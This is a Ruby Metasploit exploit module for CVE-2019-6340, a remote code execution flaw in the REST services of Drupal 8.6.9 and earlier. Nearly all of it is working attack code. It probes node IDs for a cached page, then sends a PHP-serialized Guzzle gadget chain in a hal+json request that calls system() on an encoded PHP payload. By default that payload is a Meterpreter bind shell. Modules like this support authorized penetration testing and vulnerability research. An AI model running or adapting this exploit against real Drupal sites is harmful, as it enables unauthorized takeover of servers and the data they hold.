require 'json'
class MetasploitModule < Msf::Exploit::Remote

  include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info, 
		'Name'=> 'Drupal <= 8.6.9 REST services RCE',
    		'Description'=> %q{ Drupal <= 8.6.9 REST services RCE},
    		'Authors'=> [
        		'Roberto Focke'
    		],
    		
    		'DisclosureDate'=> '2019-03-04',
    		'License'=> 'MSF_LICENSE',
			'Platform'       => 'php',
			'Arch'           => ARCH_PHP,
			'Payload'        => {'BadChars' => "'"},
			'DefaultOptions' => {
			'PAYLOAD' => 'php/meterpreter/bind_tcp'
				},
		
		'Targets' => [['Drupal <= 8.6.9', {}]],
		'References'=> [
			[ 'CVE', '2019-6340'],
        		[ 'url', 'https://www.drupal.org/sa-core-2019-003'],
    			[ 'url', 'https://www.ambionics.io/blog/drupal8-rce'],
    			[ 'url', 'https://twitter.com/jcran/status/1099206271901798400'],
		        [ 'url', 'https://github.com/g0rx/Drupal-SA-CORE-2019-003/']
    			]
		
		))	
		register_options([
				OptString.new('TARGETURI', [true, 'The base path', '/'])
				], self.class)
	end
  	
	def comando(cmd,opts = {})
	href_url=normalize_uri(target_uri.path,"/rest/type/shortcut/default")
		
		mi_json_exploit =  JSON.pretty_generate("link" => [
		        "value": "link",
                "options": "O:24:\"GuzzleHttp\\Psr7\\FnStream\":2:{s:33:\"\u0000GuzzleHttp\\Psr7\\FnStream\u0000methods\";a:1:{s:5:\"close\";a:2:{i:0;O:23:\"GuzzleHttp\\HandlerStack\":3:{{s:32:\"\u0000GuzzleHttp\\HandlerStack\u0000handler\";s:#{cmd.length.to_s}:\"#{cmd}\";s:30:\"\u0000GuzzleHttp\\HandlerStack\u0000stack\";a:1:{i:0;a:1:{i:0;s:6:\"system\";}}s:31:\"\u0000GuzzleHttp\\HandlerStack\u0000cached\";b:0;}i:1;s:7:\"resolve\";}}s:9:\"_fn_close\";a:2:{i:0;r:4;i:1;s:7:\"resolve\";}}"],
        	"_links"=> {
            	"type"=> {
                	"href": href_url
                	}
            		}
        	)
    
		print_status("mandando payload")
		print_status(mi_json_exploit)
		res=send_request_cgi(
      			'method' => 'GET',
      			'uri'    => normalize_uri(target_uri.path,"/node/#{$i.to_s}"),
      			'ctype'  => "application/hal+json",
      			'data'	 => mi_json_exploit)
      			
    return unless res
	 end  	
		

	def exploit
		
		$i=1
		
		booltest = false
		while $i < 100 and !booltest do
		
			resp=send_request_cgi(
					'method' => 'GET',
					'uri'    => normalize_uri(target_uri.path,"/node/#{$i.to_s}")
					)
			$i=$i+1
		
		if	resp.headers['X-Drupal-Cache'] == 'HIT'
			booltest = true
		end
		end
		print_status($i.to_s)
		
		cmd=payload.encode
		
		res=comando("php -r '#{cmd}'")
	end
	
end
